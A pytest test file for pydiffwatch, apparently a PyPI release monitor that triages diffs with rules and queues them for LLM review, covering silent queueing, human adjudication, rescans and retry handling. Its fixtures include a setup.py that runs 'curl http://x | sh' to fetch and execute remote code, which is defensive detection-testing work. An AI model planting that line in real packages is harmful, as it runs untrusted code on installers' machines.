"""Only a model verdict or a person alerts (npm #33 port, PR B). A deterministic result never alerts before an LLM
review: a release no model has reviewed yet waits in the review queue, silently, until one does."""
import dataclasses
import http.client
import json
import sys
import urllib.error
import zlib

import pytest

from pydiffwatch import __main__ as cli
from pydiffwatch import dashboard, differ, engine, fetcher, orchestrator, reviewer, store
from pydiffwatch import guard as guard_mod
from pydiffwatch.models import ArtifactSet, Diff, FileDiff, FiredRule, Hunk, NewRelease, TriageResult
from tests.test_pending_queue import _OK, _Backend, _REFUSED, _T, _cfg, _diff, _setup
from tests.test_unscanned import _pending_cli


def _queue_disabled(conn, rid, score=_T.score):
    """A reviewer_disabled park as the reviewer-off scan leaves it: triage stored, no input, no evidence."""
    store.update_stage(conn, rid, "triaged", score, json.dumps([r.__dict__ for r in _T.fired_rules]))
    store.park_for_review(conn, rid, "reviewer_disabled", "no reviewer this run (reviewer_enabled = false, or the "
                          "anthropic backend has no ANTHROPIC_API_KEY)", "")


# --- R1: adjudicating a queued release with no verdict row ------------------------------------------------

def test_adjudicating_a_verdictless_queued_release_writes_a_stand_in_and_alerts_once(tmp_path, capsys, monkeypatch):
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda *a, **k: (_ for _ in ()).throw(AssertionError("refetched")))
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    _queue_disabled(conn, rid)
    res = orchestrator.adjudicate(cfg, rid, "malicious", "confirmed by hand")
    assert res == {"package": "pkg", "version": "1.0.0", "label": "malicious", "alerted": True}
    [v] = conn.execute("SELECT classification, model, human_label, human_note, reasoning FROM verdicts "
                       "WHERE release_id=?", (rid,)).fetchall()
    assert tuple(v)[:4] == ("suspicious", "none", "malicious", "confirmed by hand")
    assert v["reasoning"] == "UNREVIEWED: no model reviewed it; labelled by a person."
    assert [a[0] for a in conn.execute("SELECT classification FROM alerts")] == ["malicious"]
    assert "model=human-adjudicator" in capsys.readouterr().out
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    orchestrator.drain_pending(cfg, conn, rvw, auto=False, reasons=("reviewer_disabled",))
    assert be.calls == [] and store.pending_review_counts(conn) == {}


def test_adjudicating_an_unknown_release_id_inserts_nothing(tmp_path):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    assert orchestrator.adjudicate(cfg, rid + 1, "malicious") is None
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


# --- the dashboard ------------------------------------------------------------------------------------------

def test_a_queued_release_has_no_card_and_is_counted_in_the_status_strip(tmp_path):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    _queue_disabled(conn, rid)
    rows = [dict(r) for r in store.all_verdicts(conn)]
    assert rows == [] and dashboard.counts(rows)["not_scanned"] == 0
    html = orchestrator.export_dashboard(dataclasses.replace(cfg, reviewer_enabled=False)).read_text()   # no probe
    assert "1 pending LLM review (reviewer_disabled: 1)" in html and '<div class="card' not in html


@pytest.mark.parametrize("label, flagged", [("benign", 0), ("malicious", 1)])
def test_a_label_on_a_queued_release_says_no_model_review(tmp_path, label, flagged):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    _queue_disabled(conn, rid)
    store.adjudicate(conn, rid, label, "")
    rows = [dict(r) for r in store.all_verdicts(conn)]
    html = dashboard.render_dashboard(rows)
    assert f"your verdict: {label} · no model review" in html and "model said" not in html
    assert "UNREVIEWED: no model reviewed it; labelled by a person." in html
    c = dashboard.counts(rows)
    assert (c["model_reviewed"], c["model_flagged"], c["not_scanned"]) == (1, flagged, 0)


# --- the reviewer is off -------------------------------------------------------------------------------------

_EVIL_SETUP = b"import os\nos.system('curl http://x | sh')\n"
_PLAIN_SETUP = b"from setuptools import setup\nsetup()\n"


def _art(files=None, **kw):
    return ArtifactSet("pkg", "1.1", "1.0", "sdist", files or {"setup.py": _EVIL_SETUP},
                       {"setup.py": _PLAIN_SETUP}, {}, kw.pop("added_binaries", []), **kw)


def _emitted(monkeypatch):
    calls = []
    monkeypatch.setattr(orchestrator.notifier, "emit", lambda *a, **k: calls.append(a) or True)
    return calls


def _scan(cfg, conn, rvw, art, **kw):
    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("pkg", "1.1", 5), art,
                                  **kw)
    return conn.execute("SELECT id FROM releases WHERE package='pkg' AND version='1.1'").fetchone()[0]


def _assert_queued_disabled(conn, rid):
    row = conn.execute("SELECT stage, pending_reason, review_input, review_input_chars, evidence FROM releases "
                       "WHERE id=?", (rid,)).fetchone()
    assert (row["stage"], row["pending_reason"], row["review_input_chars"]) == ("pending_review", "reviewer_disabled", 0)
    assert zlib.decompress(row["review_input"]) == b"" and row["evidence"] is None
    assert store.get_evidence(conn, rid) is None
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


def test_reviewer_disabled_queues_the_release_with_no_input_no_evidence_no_verdict_and_no_alert(tmp_path,
                                                                                                monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    rid = _scan(cfg, conn, None, _art())
    assert emitted == []
    _assert_queued_disabled(conn, rid)
    assert conn.execute("SELECT triage_score FROM releases WHERE id=?", (rid,)).fetchone()[0] >= cfg.threshold_t
    # `capture-evidence --release-id <id> --all` can still download it and store its flagged code on demand
    assert [r["release_id"] for r in store.releases_needing_evidence(conn, rid, all_flagged=True)] == [rid]


def test_reviewer_off_one_oversized_source_alone_queues_silently(tmp_path, monkeypatch):
    # PR A's M2: weight 40 makes one oversized .py escalate alone. With the reviewer off it never reaches no_content.
    emitted = _emitted(monkeypatch)
    cfg = dataclasses.replace(_cfg(tmp_path), reviewer_enabled=False)
    conn = store.connect(cfg); store.init_schema(conn)
    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"PKG-INFO": b"Version: 1.1\n"}, {"PKG-INFO": b"Version: 1.0\n"},
                      {}, added_binaries=[{"path": "pkg/big.py", "size": 5_000_000, "reason": "source-too-large",
                                           "sha256": "ab"}],
                      is_new_package=False, maintainer_metadata=None, added_dep_findings=[], too_large=("pkg/big.py",))
    rid = _scan(cfg, conn, None, art)
    rules = [r["rule"] for r in json.loads(conn.execute("SELECT triage_rules FROM releases").fetchone()[0])]
    assert rules == ["binary-source-too-large"] and emitted == []
    _assert_queued_disabled(conn, rid)


# --- every parking path queues without an alert --------------------------------------------------------------

class _Deferring:
    """A reviewer guard that admits nothing: the release parks as model_busy."""
    def input_cap_chars(self): return 200_000
    def cap_explain(self): return "cap 200000"
    def admit(self): return "breaker open after a timeout"


def _assert_quiet(conn, emitted, reason):
    assert emitted == [] and conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0
    assert [r["pending_reason"] for r in store.pending_reviews(conn)] == [reason]
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0


def test_an_unreachable_endpoint_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, rvw = _setup(tmp_path, _Backend())
    orchestrator._review_escalated(cfg, conn, rvw, _diff(), _T, rid, offline=True)
    _assert_quiet(conn, emitted, "endpoint_unreachable")


def test_a_measured_too_large_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be, max_input_chars=10_000)
    orchestrator._review_escalated(cfg, conn, rvw, _diff("x" * 50_000), _T, rid)
    _assert_quiet(conn, emitted, "too_large")
    assert be.calls == [] and "x" * 50_000 in store.review_input(store.pending_reviews(conn)[0])


def test_a_provisional_too_large_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    gd = guard_mod.ReviewerGuard(cfg, be, conn, memory=None, out=lambda m: None)
    assert gd.input_cap_chars() == guard_mod.COLD_START_CAP
    orchestrator._review_escalated(cfg, conn, rvw, _diff("x" * 60_000), _T, rid, guard=gd)
    _assert_quiet(conn, emitted, "too_large")


def test_a_model_busy_park_is_silent(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    be = _Backend()
    cfg, conn, rid, rvw = _setup(tmp_path, be)
    orchestrator._review_escalated(cfg, conn, rvw, _diff(), _T, rid, guard=_Deferring())
    _assert_quiet(conn, emitted, "model_busy")
    assert be.calls == []


def test_a_review_that_raises_in_process_fetched_parks_silently(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, rvw = _setup(tmp_path, _Backend())
    monkeypatch.setattr(differ, "build_diff", lambda art, *_: _diff())
    monkeypatch.setattr(engine, "triage", lambda *a, **k: _T)
    monkeypatch.setattr(rvw, "prepare", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("prepare broke")))
    orchestrator._process_fetched(cfg, conn, rvw, None, NewRelease("pkg", "1.0.0", 1),
                                  ArtifactSet("pkg", "1.0.0", "0.9", "sdist", {}, {}, {}))
    _assert_quiet(conn, emitted, "review_failed")


def test_an_interrupted_review_the_drain_cannot_finish_stays_queued_silently(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    store.park_for_review(conn, rid, "in_review", "the review was interrupted before it finished",
                          reviewer.build_review_input(_diff(), _T, max_chars=cfg.reviewer.max_input_chars))
    rvw = reviewer.Reviewer(cfg, backend=_Backend(fail=_REFUSED))
    for _ in range(2):
        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    _assert_quiet(conn, emitted, "endpoint_unreachable")


def test_a_partial_benign_review_waits_for_a_person_without_an_alert(tmp_path, monkeypatch):
    emitted = _emitted(monkeypatch)
    small = FileDiff("setup.py", "modified", [Hunk((0, 0), (0, 1), ["os.system('id')"], [])])
    big = FileDiff("big.py", "modified", [Hunk((0, 0), (0, 1), ["X" * 3000], [])])
    tr = TriageResult(50.0, [FiredRule("autoexec", 50.0, "setup.py", (1, 1)),
                             FiredRule("autoexec", 40.0, "big.py", (1, 1))], True)
    cfg, conn, rid, _ = _setup(tmp_path, _Backend(), max_input_chars=500)    # big.py can't fit; setup.py can
    orchestrator._review_escalated(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()),
                                   Diff("pkg", "1.0.0", False, [small, big], []), tr, rid)
    assert store.get_stage(conn, "pkg", "1.0.0") == "needs_adjudication" and emitted == []
    [v] = conn.execute("SELECT classification, reasoning FROM verdicts").fetchall()
    assert v["classification"] == "benign" and v["reasoning"].startswith("reviewed partially:")
    c = dashboard.counts([dict(r) for r in store.all_verdicts(conn)])
    assert (c["partial"], c["not_scanned"]) == (1, 0)


# --- the drain downloads and scans a reviewer_disabled release again ---------------------------------------------

def _queued_off(tmp_path, **rv):
    """A release queued with the reviewer off, then the reviewer is on: (cfg, conn, rid)."""
    cfg = _cfg(tmp_path, **rv)
    conn = store.connect(cfg); store.init_schema(conn)
    rid = _scan(dataclasses.replace(cfg, reviewer_enabled=False), conn, None, _art())
    return cfg, conn, rid


def _fetch(monkeypatch, result):
    """fetcher.fetch_artifacts returns `result`, or raises it; returns the list of releases it was asked for."""
    asked = []

    def fetch(cfg, rel, **kw):
        asked.append(rel)
        if isinstance(result, BaseException):
            raise result
        return result
    monkeypatch.setattr(fetcher, "fetch_artifacts", fetch)
    return asked


def _unavailable(cause):
    """A MetadataUnavailable chained to its cause, as fetcher.fetch_artifacts raises it."""
    try:
        raise fetcher.MetadataUnavailable(f"pkg: {type(cause).__name__}: {cause}") from cause
    except fetcher.MetadataUnavailable as e:
        return e


def test_once_a_reviewer_is_enabled_the_drain_rebuilds_and_reviews_it(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    asked = _fetch(monkeypatch, _art())
    stored = []
    real = store.update_evidence
    monkeypatch.setattr(store, "update_evidence", lambda c, r, ev: stored.append(ev) or real(c, r, ev))
    be = _Backend()
    assert orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True) == 1
    assert asked == [NewRelease("pkg", "1.1", 5)]
    [(sent, _)] = be.calls
    assert "os.system('curl http://x | sh')" in sent
    assert store.get_stage(conn, "pkg", "1.1") == "reviewed"
    assert len(stored) == 1 and "os.system" in stored[0]       # stored, then cleared by the benign verdict


def test_a_rebuilt_release_the_model_calls_suspicious_keeps_its_evidence(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, _art())
    be = _Backend()
    be.complete = lambda **kw: be.calls.append(kw) or _OK.replace('"benign"', '"suspicious"')
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    assert store.get_stage(conn, "pkg", "1.1") == "needs_adjudication"
    assert "os.system" in store.get_evidence(conn, rid)


def test_a_release_the_current_rules_no_longer_escalate_is_cleared_without_a_review_or_an_alert(tmp_path,
                                                                                                monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, _art({"setup.py": _PLAIN_SETUP, "pkg/mod.py": b"X = 1\n"}))   # nothing fires today
    be = _Backend()
    assert orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True) == 1
    row = conn.execute("SELECT stage, pending_reason, triage_score, review_attempts FROM releases WHERE id=?",
                       (rid,)).fetchone()
    assert tuple(row) == ("triaged", None, 0.0, 0) and be.calls == []
    assert conn.execute("SELECT count(*) FROM verdicts").fetchone()[0] == 0
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0


def test_the_rebuild_scores_the_release_with_the_current_rules(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    conn.execute("UPDATE releases SET triage_score=99, triage_rules=? WHERE id=?",
                 (json.dumps([{"rule": "retired-rule", "weight": 99.0, "file": "setup.py", "lines": [1, 1]}]), rid))
    conn.commit()
    _fetch(monkeypatch, _art())
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)
    tr = engine.triage(differ.build_diff(_art(), {"current": None, "prior": None}), cfg,
                       orchestrator._load_ruleset(cfg), {"current": None, "prior": None})
    row = conn.execute("SELECT triage_score, triage_rules FROM releases WHERE id=?", (rid,)).fetchone()
    assert row["triage_score"] == tr.score
    assert json.loads(row["triage_rules"]) == json.loads(json.dumps([r.__dict__ for r in tr.fired_rules]))


@pytest.mark.parametrize("result", [
    fetcher.MetadataGone("pkg: PyPI metadata returned 404"),
    fetcher.NoSdist(),
    fetcher.RefusedToExtract("members"),
    TimeoutError("download took longer than 120s"),
    urllib.error.HTTPError("https://files.pythonhosted.org/x.tar.gz", 404, "Not Found", {}, None),
])
def test_a_release_that_cannot_be_downloaded_again_uses_up_its_attempts_then_alerts_once(tmp_path, monkeypatch,
                                                                                        result):
    cfg, conn, rid = _queued_off(tmp_path)
    asked = _fetch(monkeypatch, result)
    be = _Backend()
    rvw = reviewer.Reviewer(cfg, backend=be)
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    [row] = store.pending_reviews(conn)
    assert (row["pending_reason"], row["review_attempts"]) == ("review_failed", 1)
    assert "could not download and scan it again" in row["pending_detail"]
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0 and be.calls == []
    for _ in range(cfg.reviewer.max_review_attempts + 1):
        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    assert [k for (k,) in conn.execute("SELECT dedupe_key FROM alerts")] == \
        ["pkg|1.1|suspicious-heuristic|unscanned:review_failed"]
    reasoning = conn.execute("SELECT reasoning FROM verdicts WHERE release_id=?", (rid,)).fetchone()[0]
    assert reasoning.startswith("UNREVIEWED: pydiffwatch could not download and scan it again for review 3 times")
    assert "so no model has seen it" in reasoning and "another model" not in reasoning
    assert len(asked) == cfg.reviewer.max_review_attempts and be.calls == []


def test_an_exception_while_rescanning_counts_as_a_failed_attempt(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, _art())
    monkeypatch.setattr(differ, "build_diff", lambda *a, **k: (_ for _ in ()).throw(ValueError("bad diff")))
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)
    [row] = store.pending_reviews(conn)
    assert (row["pending_reason"], row["review_attempts"]) == ("review_failed", 1)
    assert "could not download and scan it again to review (ValueError: bad diff)" in row["pending_detail"]


@pytest.mark.parametrize("error", [
    _unavailable(urllib.error.HTTPError("https://pypi.org/pypi/pkg/json", 503, "Service Unavailable", {}, None)),
    urllib.error.HTTPError("https://files.pythonhosted.org/x.tar.gz", 502, "Bad Gateway", {}, None),
    urllib.error.URLError(ConnectionRefusedError()),
    ConnectionResetError(54, "Connection reset by peer"),
    http.client.IncompleteRead(b""),
    http.client.RemoteDisconnected("Remote end closed connection without response"),
])
def test_pypi_unreachable_spends_no_attempt_and_sends_no_alert(tmp_path, monkeypatch, error):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, error)
    for _ in range(5):
        orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)
    [row] = store.pending_reviews(conn)
    assert (row["pending_reason"], row["review_attempts"]) == ("reviewer_disabled", 0)
    assert row["pending_detail"].startswith("could not reach PyPI to download it again; retried next tick")
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0


def test_a_pypi_outage_costs_one_download_per_drain_and_stored_inputs_are_still_reviewed(tmp_path, monkeypatch):
    cfg, conn, _ = _queued_off(tmp_path)
    for i, pkg in enumerate(("q2", "q3")):
        _queue_disabled(conn, store.record_release(conn, pkg, "1.0", 10 + i, False, None, "sdist"))
    text = reviewer.build_review_input(_diff(), _T, max_chars=cfg.reviewer.max_input_chars)
    for i, (pkg, reason) in enumerate((("down", "endpoint_unreachable"), ("busy", "model_busy"))):
        store.park_for_review(conn, store.record_release(conn, pkg, "1.0", 20 + i, False, None, "sdist"),
                              reason, "x", text)
    asked = _fetch(monkeypatch, _unavailable(urllib.error.URLError(ConnectionRefusedError())))
    be = _Backend()
    assert orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True) == 2
    assert len(asked) == 1 and len(be.calls) == 2
    assert sorted(store.pending_review_counts(conn).items()) == [("reviewer_disabled", 3)]


def test_a_pypi_read_stall_spends_one_attempt_per_drain_not_one_per_row(tmp_path, monkeypatch):
    """Final review I2: a definitive TimeoutError still spends its attempt, but stops the drain's other rebuilds."""
    cfg, conn, first = _queued_off(tmp_path)
    for i, pkg in enumerate(("q2", "q3")):
        _queue_disabled(conn, store.record_release(conn, pkg, "1.0", 10 + i, False, None, "sdist"))
    asked = _fetch(monkeypatch, TimeoutError("sdist read stalled"))
    rvw = reviewer.Reviewer(cfg, backend=_Backend())

    def attempts():
        return dict(conn.execute("SELECT id, COALESCE(review_attempts,0) FROM releases").fetchall())
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    got = attempts()
    assert got[first] == 1 and sorted(got.values()) == [0, 0, 1] and len(asked) == 1
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0
    for n in (2, 3):
        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
        assert len(asked) == n       # one download per drain
    got = attempts()
    assert got[first] == cfg.reviewer.max_review_attempts and sorted(got.values()) == [0, 0, 3]
    assert [k for (k,) in conn.execute("SELECT dedupe_key FROM alerts")] == \
        ["pkg|1.1|suspicious-heuristic|unscanned:review_failed"]


def test_a_rebuild_downloads_with_the_attempt_it_is_on(tmp_path, monkeypatch):
    """Final review I1: attempt k of a rebuild gets the scaled deadlines the scan's retry sweep uses."""
    cfg, conn, rid = _queued_off(tmp_path)
    seen = []

    def fetch(cfg, rel, attempt=1):
        seen.append(attempt)
        if len(seen) == 1:
            raise fetcher.MetadataGone("pkg: PyPI metadata returned 404")
        return _art()
    monkeypatch.setattr(fetcher, "fetch_artifacts", fetch)
    rvw = reviewer.Reviewer(cfg, backend=_Backend())
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    assert store.pending_reviews(conn)[0]["review_attempts"] == 1
    orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    assert seen == [1, 2] and store.get_stage(conn, "pkg", "1.1") == "reviewed"


def test_a_rebuilt_input_is_stored_before_the_review_so_a_crash_does_not_download_it_again(tmp_path, monkeypatch):
    """Final review M1: a kill mid-review leaves the rebuilt input queued as in_review."""
    cfg, conn, rid = _queued_off(tmp_path)
    asked = _fetch(monkeypatch, _art())
    crash = _Backend()
    crash.complete = lambda **kw: (_ for _ in ()).throw(KeyboardInterrupt())
    with pytest.raises(KeyboardInterrupt):
        orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=crash), auto=True)
    [row] = store.pending_reviews(conn)
    assert row["pending_reason"] == "in_review" and "os.system" in store.review_input(row)
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    assert len(asked) == 1 and len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"


def test_a_busy_guard_defers_a_rebuild_before_it_downloads(tmp_path, monkeypatch):
    """Final review M2: no download for a review the guard would not send."""
    cfg, conn, rid = _queued_off(tmp_path)
    asked = _fetch(monkeypatch, _art())
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True, guard=_Deferring())
    [row] = store.pending_reviews(conn)
    assert asked == [] and (row["pending_reason"], row["review_input_chars"]) == ("model_busy", 0)
    assert row["pending_detail"] == "breaker open after a timeout"
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    assert len(asked) == 1 and len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"


class _DeferAfterFirst(_Deferring):
    """Admits once (the rebuild's check), then defers (the review's check)."""
    def __init__(self): self.n = 0

    def admit(self):
        self.n += 1
        return None if self.n == 1 else super().admit()


def test_a_rebuilt_input_the_guard_defers_is_stored_and_never_downloaded_twice(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    asked = _fetch(monkeypatch, _art())
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True,
                               guard=_DeferAfterFirst())
    [row] = store.pending_reviews(conn)
    assert row["pending_reason"] == "model_busy" and "os.system" in store.review_input(row)
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    assert len(asked) == 1 and len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"


def test_a_lowered_max_review_attempts_after_a_failed_rebuild_alerts_with_the_rebuild_wording(tmp_path,
                                                                                               monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, fetcher.MetadataGone("pkg: PyPI metadata returned 404"))
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)     # attempt 1 of 3
    low = dataclasses.replace(cfg, reviewer=dataclasses.replace(cfg.reviewer, max_review_attempts=1))
    orchestrator.drain_pending(low, conn, reviewer.Reviewer(low, backend=_Backend()), auto=True)
    reasoning = conn.execute("SELECT reasoning FROM verdicts WHERE release_id=?", (rid,)).fetchone()[0]
    assert reasoning.startswith("UNREVIEWED: pydiffwatch could not download and scan it again for review 1 times")
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 1


def test_a_rebuilt_input_over_the_cap_waits_as_too_large_with_its_input(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path, max_input_chars=10_000)
    _fetch(monkeypatch, _art({"setup.py": _EVIL_SETUP + b"PAD = '" + b"y" * 50_000 + b"'\n"}))
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    [row] = store.pending_reviews(conn)
    assert row["pending_reason"] == "too_large" and "cap 10000" in row["pending_detail"]
    assert row["review_input_chars"] > 10_000 and "y" * 50_000 in store.review_input(row)
    assert be.calls == [] and conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0


# --- bounded queue reads (R2) ---------------------------------------------------------------------------------------

def _trace(conn):
    seen = []
    conn.set_trace_callback(seen.append)
    return seen


def test_the_auto_drain_reads_a_bounded_window_with_model_busy_first(tmp_path, monkeypatch):
    cfg, conn, _ = _queued_off(tmp_path)
    for i in range(99):
        _queue_disabled(conn, store.record_release(conn, f"q{i}", "1.0", 10 + i, False, None, "sdist"))
    busy = store.record_release(conn, "busy", "1.0", 500, False, None, "sdist")
    store.park_for_review(conn, busy, "model_busy", "x",
                          reviewer.build_review_input(_diff("exec(busy)"), _T, max_chars=cfg.reviewer.max_input_chars))
    _fetch(monkeypatch, _unavailable(urllib.error.URLError(ConnectionRefusedError())))
    got = []
    real = store.pending_reviews
    monkeypatch.setattr(store, "pending_reviews", lambda *a, **k: got.append(real(*a, **k)) or got[-1])
    seen = _trace(conn)
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    queries = [q for q in seen if "FROM releases WHERE stage='pending_review'" in q]
    assert len(queries) == 2 and all(q.endswith(f"LIMIT {cfg.reviewer.max_pending_per_tick}") for q in queries)
    assert all(len(rows) <= cfg.reviewer.max_pending_per_tick for rows in got)
    assert got[0][0]["package"] == "busy" and "exec(busy)" in be.calls[0][0]


def test_the_stage_index_is_created_once(tmp_path):
    cfg = _cfg(tmp_path)
    conn = store.connect(cfg); store.init_schema(conn)
    schema = conn.execute("SELECT type, name, sql FROM sqlite_master ORDER BY name").fetchall()
    assert ("index", "releases_stage") in [(r[0], r[1]) for r in schema]
    store.init_schema(conn)
    assert conn.execute("SELECT type, name, sql FROM sqlite_master ORDER BY name").fetchall() == schema
    plan = conn.execute("EXPLAIN QUERY PLAN SELECT pending_reason, count(*) FROM releases "
                        "WHERE stage='pending_review' GROUP BY pending_reason").fetchall()
    assert any("releases_stage" in r[-1] for r in plan)


def test_the_manual_drain_reads_pages_and_reviews_the_whole_queue(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    text = reviewer.build_review_input(_diff(), _T, max_chars=cfg.reviewer.max_input_chars)
    store.park_for_review(conn, rid, "too_large", "x", text)
    conn.executemany("INSERT INTO releases(package, version, serial, stage, pending_reason, pending_detail, "
                     "review_input, review_input_chars, triage_score, triage_rules) "
                     "VALUES(?, '1.0', ?, 'pending_review', 'too_large', 'x', ?, ?, 60, '[]')",
                     [(f"q{i}", 10 + i, zlib.compress(text.encode()), len(text)) for i in range(1_199)])
    conn.commit()
    sizes = []
    real = store.pending_reviews
    monkeypatch.setattr(store, "pending_reviews", lambda *a, **k: sizes.append(len(r := real(*a, **k))) or r)
    be = _Backend()
    assert orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=False) == 1_200
    assert sizes == [500, 500, 200, 0] and len(be.calls) == 1_200 and store.pending_review_counts(conn) == {}


# --- a metadata failure is transient only when PyPI itself is unreachable (Task 4 review I1/I2) ---------------------

def _http(code):
    return urllib.error.HTTPError("https://pypi.org/pypi/pkg/json", code, "x", {}, None)


@pytest.mark.parametrize("cause, transient", [
    (TimeoutError("package JSON took longer than 30s"), "stall"),
    (json.JSONDecodeError("Expecting value", "<html>", 0), False),
    (_http(403), False),
    (_http(410), False),
    (_http(503), True),
    (urllib.error.URLError(ConnectionRefusedError()), True),
    (ConnectionResetError(54, "Connection reset by peer"), True),
])
def test_a_metadata_failure_is_classified_by_its_cause(tmp_path, monkeypatch, cause, transient):
    cfg, conn, rid = _queued_off(tmp_path)
    _queue_disabled(conn, store.record_release(conn, "q2", "1.0", 10, False, None, "sdist"))
    asked = []
    monkeypatch.setattr(fetcher, "_package_json", lambda pkg, c: asked.append(pkg) or (_ for _ in ()).throw(cause))
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=_Backend()), auto=True)
    rows = store.pending_reviews(conn)
    if transient is True:      # no attempt, and the drain downloads nothing more (pypi_down)
        assert asked == ["pkg"]
        assert [(r["pending_reason"], r["review_attempts"]) for r in rows] == [("reviewer_disabled", 0)] * 2
        assert rows[0]["pending_detail"].startswith("could not reach PyPI to download it again")
    elif transient == "stall":     # one attempt, and the drain downloads nothing more (final review I2)
        assert asked == ["pkg"]
        assert [(r["pending_reason"], r["review_attempts"]) for r in rows] == \
            [("review_failed", 1), ("reviewer_disabled", 0)]
        assert "could not download and scan it again to review (MetadataUnavailable: " in rows[0]["pending_detail"]
    else:              # one attempt, and the next row is still rebuilt
        assert asked == ["pkg", "q2"]
        assert [(r["pending_reason"], r["review_attempts"]) for r in rows] == [("review_failed", 1)] * 2
        assert "could not download and scan it again to review (MetadataUnavailable: " in rows[0]["pending_detail"]
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 0


def test_one_project_whose_metadata_is_gone_for_good_does_not_block_the_other_rebuilds(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path)
    conn = store.connect(cfg); store.init_schema(conn)
    a = store.record_release(conn, "a", "1.0", 1, False, None, "sdist")      # queued first: drained first
    _queue_disabled(conn, a)
    _scan(dataclasses.replace(cfg, reviewer_enabled=False), conn, None, _art())

    def fetch(cfg, rel, **kw):
        if rel.package == "a":
            raise _unavailable(_http(410))
        return _art()
    monkeypatch.setattr(fetcher, "fetch_artifacts", fetch)
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=True)
    assert len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"
    [row] = store.pending_reviews(conn)
    assert (row["release_id"], row["pending_reason"], row["review_attempts"]) == (a, "review_failed", 1)


